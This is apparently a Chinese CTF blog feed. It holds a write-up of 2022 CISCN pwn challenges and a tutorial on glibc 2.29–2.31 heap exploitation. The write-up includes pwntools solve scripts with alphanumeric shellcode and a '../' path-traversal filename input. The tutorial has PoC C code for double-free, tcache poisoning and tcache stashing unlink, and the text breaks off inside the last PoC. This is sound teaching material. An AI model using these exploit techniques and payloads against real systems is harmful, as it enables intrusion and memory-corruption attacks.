href="#level5-45" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-46"><a href="#level5-46" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-47"><a href="#level5-47" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-48"><a href="#level5-48" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-49"><a href="#level5-49" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-50"><a href="#level5-50" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-51"><a href="#level5-51" class="headerlink" title="level5"></a>level5</h1>]]></content>
      <tags>
        <tag>pwn.college</tag>
      </tags>
  </entry>
  <entry>
    <title>2022ciscn pwn</title>
    <url>/2022/07/05/2022-07-05-2022ciscn-pwn/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今年ciscn总共三题pwn，一题算是签到，一题2.34的堆做一半没成功，一题LLVM PASS没学过完全不会。分区赛六题pwn，awdplus的模式，成了修洞的乐园。</p>
<h1 id="login-nomal"><a href="#login-nomal" class="headerlink" title="login-nomal"></a>login-nomal</h1><p>这题其实做过类似的，在蓝帽杯还是哪来着做过，在代码审计部分差不多一致，只是在最后的利用过程有改动。首先就是一个循环执行函数，接着看函数的主要内容。</p>
<p><img src="/2022/07/05/2022-07-05-2022ciscn-pwn/image-20220705213148416.png"><span class="image-caption">image-20220705213148416</span></p>
<p>接着看又是一个循环，这个循环就是这题最麻烦的点了，需要一步步的耐心整理，当时我做是直接找了类似题目进行比较的，所以没花多少功夫，需要注意一下的就是msg后跟的字符串要多输入一个，因为处理的时候strlen-1了，会少一个字符。</p>
<p><img src="/2022/07/05/2022-07-05-2022ciscn-pwn/image-20220705213257184.png"><span class="image-caption">image-20220705213257184</span></p>
<p>审完上面的代码，接下来就是主要的菜单内容，主要关注1和3执行的内容。</p>
<p><img src="/2022/07/05/2022-07-05-2022ciscn-pwn/image-20220705213831271.png"><span class="image-caption">image-20220705213831271</span></p>
<p>在执行1函数可以设置一个flag为1，这个为3执行到mmap提供真的判断条件，而要能够执行这串代码，需要的是先通过isprint的检验，所以就是只能输入明文字符，这就涉及到的一个考点就是明文字符书写shellcode。明文字符生成可以通过alpha3或者AE64进行自动生成。我使用的是alpha3，执行命令为：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python ./ALPHA3.py x64 ascii mixedcase rdx --input=&quot;shellcode&quot;<br></code></pre></td></tr></table></figure>

<p>rdx是指call后面跟着的那个寄存器，也就是存放shellcode首地址的寄存器。</p>
<p><img src="/2022/07/05/2022-07-05-2022ciscn-pwn/image-20220705213700566.png"><span class="image-caption">image-20220705213700566</span></p>
<p><img src="/2022/07/05/2022-07-05-2022ciscn-pwn/image-20220705213732318.png"><span class="image-caption">image-20220705213732318</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./login&#x27;</span>)<br>DEBUG = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> DEBUG:<br>    libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/libc-2.33.so&quot;</span>)<br>    ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/ld-2.33.so&quot;</span>)<br>    p = process(argv=[ld.path,elf.path], env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>    p = process(<span class="hljs-string">&#x27;./login&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    ip = <span class="hljs-string">&#x27;47.93.156.2&#x27;</span><br>    port = <span class="hljs-number">24875</span><br>    <span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>    p = remote(ip, port)<br> <br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p, <span class="hljs-string">&quot;b main&quot;</span>)<br>	<span class="hljs-comment">#gdb.attach(p, &quot;b *$rebase(0x)&quot;)</span><br><br><br>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>p.send(<span class="hljs-string">&quot;opt:1\nmsg:ro0ta\n\n&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br><span class="hljs-comment">#debug()</span><br>p.send(<span class="hljs-string">&quot;opt:2\nmsg:Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070ta\n\n&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h1 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h1><p>这题跑去问了柘狐师傅，也是个签到题。但是比赛那会没做出来，太菜了。</p>
<p>利用点在于black初始值是为0的，那么没有过滤<code>..</code></p>
<p><img src="/2022/07/05/2022-07-05-2022ciscn-pwn/image-20220707093637899.png"><span class="image-caption">image-20220707093637899</span></p>
<p>同时，因为可以输入文件的名字，并且是可以含有<code>.</code>和<code>/</code>，那么就存在了目录穿越的问题，利用<code>../</code>可以返回到上一级的特点，可以把flag内容打印出来。</p>
<p><img src="/2022/07/05/2022-07-05-2022ciscn-pwn/image-20220707093800921.png"><span class="image-caption">image-20220707093800921</span></p>
<p><img src="/2022/07/05/2022-07-05-2022ciscn-pwn/image-20220707093746094.png"><span class="image-caption">image-20220707093746094</span></p>
<p>打印出的内容为base64加密的结果，解码即可。</p>
<p><img src="/2022/07/05/2022-07-05-2022ciscn-pwn/image-20220707094151700.png"><span class="image-caption">image-20220707094151700</span></p>
<p><img src="/2022/07/05/2022-07-05-2022ciscn-pwn/image-20220707094220973.png"><span class="image-caption">image-20220707094220973</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p = remote(&#x27;172.16.9.45&#x27;, 8087)</span><br>p = process(<span class="hljs-string">&#x27;./pwn2&#x27;</span>)<br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;change filename? (y/N)&quot;</span>)<br>p.send(<span class="hljs-string">&#x27;y&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;input new filename: &quot;</span>)<br>p.send(<span class="hljs-string">&quot;../home/shoucheng/pwn/flag\n&quot;</span>)<br>p.shutdown(<span class="hljs-string">&#x27;write&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>



]]></content>
  </entry>
  <entry>
    <title>glibc-2.31版本利用</title>
    <url>/2022/03/14/2022-03-14-glibc-2.31%E7%89%88%E6%9C%AC%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h1 id="glibc-2-29-2-31"><a href="#glibc-2-29-2-31" class="headerlink" title="glibc-2.29~2.31"></a>glibc-2.29~2.31</h1><h2 id="fastbin-double-free"><a href="#fastbin-double-free" class="headerlink" title="fastbin_double_free"></a>fastbin_double_free</h2><p>需要构造：前一个释放堆块 old，与当前释放堆块 p 有 old != p。</p>
<p><code>fastbin double free</code> 的 poc 利用如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">/*this is double free related security mechanisms in glibc 2.29.</span><br><span class="hljs-comment">     *	if (__builtin_expect (old == p, 0))</span><br><span class="hljs-comment">	  malloc_printerr (&quot;double free or corruption (fasttop)&quot;);</span><br><span class="hljs-comment">    * */</span><br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>);<br>    setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fastbin_double_free can help you achieve \&quot;arbitrary address writes\&quot;\n&quot;</span>);<br><br>    <span class="hljs-keyword">void</span> *q,*r,*d;<br>    <span class="hljs-keyword">void</span> *p[<span class="hljs-number">7</span>];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;First of all ,we need to Apply for heap blocks of the same size to consume tcache!\n&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">7</span>;i++)<br>    &#123;<br>        p[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;p[%d]  ===&gt;  %p\n&quot;</span>,i,p[i]);<br>    &#125;<br>    q = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    r = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;now , we need to free 7 heap blocks to populate tcache linked list!\n&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">7</span>;i++)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;now free p[%d]  ===&gt;  %p\n&quot;</span>,i,p[i]);<br>        <span class="hljs-built_in">free</span>(p[i]);<br>        p[i] = <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;now ,Our free heap blocks will be put into fastbin\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;now free q  ===&gt;  %p\n&quot;</span>,q);<br>    <span class="hljs-built_in">free</span>(q);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;in order to achieve double free , we need to free another block to bypass check in glibc 2.29 !\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;now free r  ===&gt;  %p\n&quot;</span>,r);<br>    <span class="hljs-built_in">free</span>(r);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;now we free q again!\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;now free q  ===&gt;  %p\n&quot;</span>,q);<br>    <span class="hljs-built_in">free</span>(q);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;OK,we already achieve double free in glibc 2.29.!\n&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p><img src="/2022/03/14/2022-03-14-glibc-2.31%E7%89%88%E6%9C%AC%E5%88%A9%E7%94%A8/image-20220419185557111.png"><span class="image-caption">image-20220419185557111</span></p>
<p>申请出九个堆块。</p>
<p><img src="/2022/03/14/2022-03-14-glibc-2.31%E7%89%88%E6%9C%AC%E5%88%A9%E7%94%A8/image-20220419185812476.png"><span class="image-caption">image-20220419185812476</span></p>
<p>释放掉七个堆块，填满 tcache bin。</p>
<p><img src="/2022/03/14/2022-03-14-glibc-2.31%E7%89%88%E6%9C%AC%E5%88%A9%E7%94%A8/image-20220419185951969.png"><span class="image-caption">image-20220419185951969</span></p>
<p>再释放 p、q 两个堆块，由于 tcache bin 满了，进入到 fastbin 中 </p>
<p><img src="/2022/03/14/2022-03-14-glibc-2.31%E7%89%88%E6%9C%AC%E5%88%A9%E7%94%A8/image-20220419190144978.png"><span class="image-caption">image-20220419190144978</span></p>
<h3 id="fastbin-double-free-利用总结"><a href="#fastbin-double-free-利用总结" class="headerlink" title="fastbin_double_free 利用总结"></a>fastbin_double_free 利用总结</h3><p>效果：实现任意地址写</p>
<ul>
<li>释放七个堆块填满 tcache bin。</li>
<li>再释放两个堆块进入 fastbin，按照 p-q-p 的顺序释放，即可形成 double free。</li>
</ul>
<h2 id="tcache-double-free"><a href="#tcache-double-free" class="headerlink" title="tcache_double_free"></a><strong>tcache_double_free</strong></h2><p>poc如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc,<span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//glibc 2.29 Security Mechanism</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     *if (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="hljs-comment">	  &#123;</span><br><span class="hljs-comment">	    tcache_entry *tmp;</span><br><span class="hljs-comment">	    LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);</span><br><span class="hljs-comment">	    for (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="hljs-comment">		 tmp;</span><br><span class="hljs-comment">		 tmp = tmp-&gt;next)</span><br><span class="hljs-comment">	      if (tmp == e)</span><br><span class="hljs-comment">		malloc_printerr (&quot;free(): double free detected in tcache 2&quot;);</span><br><span class="hljs-comment">	    // If we get here, it was a coincidence.  We&#x27;ve wasted a</span><br><span class="hljs-comment">	       few cycles, but don&#x27;t abort.  </span><br><span class="hljs-comment">	  &#125;</span><br><span class="hljs-comment">     */</span><br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>);<br>    setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;tcache_double_free can help you achieve \&quot;arbitrary address writes\&quot;\n&quot;</span>);<br>    <span class="hljs-keyword">void</span> *p,*q,*r,*d;<br>    p = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">free</span>(p);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;now we already free p = %p\n&quot;</span>,p);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;we can change its key to help us achieve double free\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;its key = %p,now\n&quot;</span>,*(<span class="hljs-keyword">uint64_t</span> *)(p+<span class="hljs-number">8</span>));<br>    *(<span class="hljs-keyword">uint64_t</span> *)(p + <span class="hljs-number">8</span>) = <span class="hljs-number">0x122220</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;after we change,its key = %p\n&quot;</span>,*(<span class="hljs-keyword">uint64_t</span> *)(p+<span class="hljs-number">8</span>));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;so we can achieve double free!&quot;</span>);<br>    <span class="hljs-built_in">free</span>(p);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;now we already achieve double free in glibc 2.29&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/2022/03/14/2022-03-14-glibc-2.31%E7%89%88%E6%9C%AC%E5%88%A9%E7%94%A8/image-20220419193416703.png"><span class="image-caption">image-20220419193416703</span></p>
<p>2.29以后的版本，在释放堆块的 bk 位置将会填上 tcache 的地址作为一个 key，如果 key == tcache 则说明堆块已释放。</p>
<p><img src="/2022/03/14/2022-03-14-glibc-2.31%E7%89%88%E6%9C%AC%E5%88%A9%E7%94%A8/image-20220419193649480.png"><span class="image-caption">image-20220419193649480</span></p>
<p><img src="/2022/03/14/2022-03-14-glibc-2.31%E7%89%88%E6%9C%AC%E5%88%A9%E7%94%A8/image-20220419193807297.png"><span class="image-caption">image-20220419193807297</span></p>
<p>将这个key值改掉即可与之前版本一般，直接再次释放该堆块形成 double free。</p>
<h3 id="tcache-double-free-利用总结"><a href="#tcache-double-free-利用总结" class="headerlink" title="tcache_double_free 利用总结"></a>tcache_double_free 利用总结</h3><p>效果：实现任意地址写</p>
<ul>
<li>释放一个堆块。</li>
<li>修改堆块 bk 位置上的 key。</li>
<li>再次释放该堆块。</li>
</ul>
<h2 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h2><p>在 glibc-2.31 中，tcache count 的数量不能小于 0，否则将无法分配堆块。 </p>
<p>poc如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-comment">// disable buffering</span><br>	setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>	setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This file demonstrates a simple tcache poisoning attack by tricking malloc into\n&quot;</span><br>		   <span class="hljs-string">&quot;returning a pointer to an arbitrary location (in this case, the stack).\n&quot;</span><br>		   <span class="hljs-string">&quot;The attack is very similar to fastbin corruption attack.\n&quot;</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n&quot;</span><br>		   <span class="hljs-string">&quot;We have to create and free one more chunk for padding before fd pointer hijacking.\n\n&quot;</span>);<br><br>	<span class="hljs-keyword">size_t</span> stack_var;<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, (<span class="hljs-keyword">char</span> *)&amp;stack_var);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Allocating 2 buffers.\n&quot;</span>);<br>	<span class="hljs-keyword">intptr_t</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc(128): %p\n&quot;</span>, a);<br>	<span class="hljs-keyword">intptr_t</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc(128): %p\n&quot;</span>, b);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Freeing the buffers...\n&quot;</span>);<br>	<span class="hljs-built_in">free</span>(a);<br>	<span class="hljs-built_in">free</span>(b);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, a);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot;</span><br>		   <span class="hljs-string">&quot;to point to the location to control (%p).\n&quot;</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">intptr_t</span>), b, &amp;stack_var);<br>	b[<span class="hljs-number">0</span>] = (<span class="hljs-keyword">intptr_t</span>)&amp;stack_var;<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, &amp;stack_var);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>));<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, &amp;stack_var);<br><br>	<span class="hljs-keyword">intptr_t</span> *c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;2nd malloc(128): %p\n&quot;</span>, c);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We got the control\n&quot;</span>);<br><br>	assert((<span class="hljs-keyword">long</span>)&amp;stack_var == (<span class="hljs-keyword">long</span>)c);<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/2022/03/14/2022-03-14-glibc-2.31%E7%89%88%E6%9C%AC%E5%88%A9%E7%94%A8/image-20220419222640503.png"><span class="image-caption">image-20220419222640503</span></p>
<p>申请出两个堆块，然后再将其释放，顺序为 b -&gt; a。</p>
<p><img src="/2022/03/14/2022-03-14-glibc-2.31%E7%89%88%E6%9C%AC%E5%88%A9%E7%94%A8/image-20220419223405043.png"><span class="image-caption">image-20220419223405043</span></p>
<p>修改 b 的 fd 指针指向要修改的内容，然后只需要将堆块分配即可。</p>
<h3 id="tcache-poisoning-利用总结"><a href="#tcache-poisoning-利用总结" class="headerlink" title="tcache_poisoning 利用总结"></a>tcache_poisoning 利用总结</h3><p>效果：实现任意地址写</p>
<ul>
<li>释放堆块 b -&gt; a</li>
<li>修改 b 的指针指向想要分配堆块的地址</li>
</ul>
<p>相比与之前版本可以让 count 为负值，构造链表尾部的堆块；glibc-2.31需要在前一个堆块开始构造，绕过 count 的限制，</p>
<h2 id="tcache-stashing-unlink"><a href="#tcache-stashing-unlink" class="headerlink" title="tcache_stashing_unlink"></a><strong>tcache_stashing_unlink</strong></h2><p>libc-2.29开始，出现了一种叫 stash 的机制，基本原理就是当调用 _int_malloc 时，如果从 smallbin 或者 fastbin 中取出 chunk之后，对应大小的 tcache 没有满，就会把剩下的 bin 放入 tcache 中</p>
<p>poc如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;inttypes.h&gt;</span></span><br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">uint64_t</span> victim = <span class="hljs-number">0</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span>&#123;<br>	setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>);<br>	setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0</span>);<br><br>	<span class="hljs-keyword">char</span> *t1;<br>	<span class="hljs-keyword">char</span> *s1, *s2, *pad;<br>	<span class="hljs-keyword">char</span> *tmp;<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You can use this technique to write a big number to arbitrary address instead of unsortedbin attack\n&quot;</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n1. need to know heap address and the victim address that you need to attack\n&quot;</span>);<br><br>	tmp = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;victim&#x27;s address: %p, victim&#x27;s vaule: 0x%lx\n&quot;</span>, &amp;victim, victim);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;heap address: %p\n&quot;</span>, tmp<span class="hljs-number">-0x260</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n2. choose a stable size and free six identical size chunks to tcache_entry list\n&quot;</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Here, I choose the size 0x60\n&quot;</span>);<br>	<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">6</span>; i++)&#123;<br>		t1 = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>);<br>		<span class="hljs-built_in">free</span>(t1);<br>	&#125;<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n&quot;</span>, <br>		t1, t1<span class="hljs-number">-0x60</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">2</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">3</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">4</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">5</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n3. free two chunk with the same size like tcache_entry into the corresponding smallbin\n&quot;</span>);<br><br>	s1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x420</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Alloc a chunk %p, whose size is beyond tcache size threshold\n&quot;</span>, s1);<br>	pad = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Alloc a padding chunk, avoid %p to merge to top chunk\n&quot;</span>, s1);<br>	<span class="hljs-built_in">free</span>(s1);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Free chunk %p to unsortedbin\n&quot;</span>, s1);<br>	<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x3c0</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\n&quot;</span>);<br>	<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\n&quot;</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;chunk %p is in smallbin[4], whose size is 0x60\n&quot;</span>, s1+<span class="hljs-number">0x3c0</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Repeat the above steps, and free another chunk into corresponding smallbin\n&quot;</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\n&quot;</span>);<br>	s2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x420</span>);<br>	pad = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>	<span class="hljs-built_in">free</span>(s2);<br>	<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x3c0</span>);<br>	<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;chunk %p is in smallbin[4], whose size is 0x60\n&quot;</span>, s2+<span class="hljs-number">0x3c0</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;smallbin[4] list is %p &lt;--&gt; %p\n&quot;</span>, s2+<span class="hljs-number">0x3c0</span>, s1+<span class="hljs-number">0x3c0</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n4. overwrite the first chunk in smallbin[4]&#x27;s bk pointer to &amp;victim-0x10 address, the first chunk is smallbin[4]-&gt;fd\n&quot;</span>);<br>	<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Change %p&#x27;s bk pointer to &amp;victim-0x10 address: 0x%lx\n&quot;</span>, s2+<span class="hljs-number">0x3c0</span>, (<span class="hljs-keyword">uint64_t</span>)(&amp;victim)<span class="hljs-number">-0x10</span>);<br>	*(<span class="hljs-keyword">uint64_t</span>*)((s2+<span class="hljs-number">0x3c0</span>)+<span class="hljs-number">0x18</span>) = (<span class="hljs-keyword">uint64_t</span>)(&amp;victim)<span class="hljs-number">-0x10</span>;<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n5. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\n&quot;</span>);<br><br>	<span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Finally, the victim&#x27;s value is changed to a big number\n&quot;</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now, 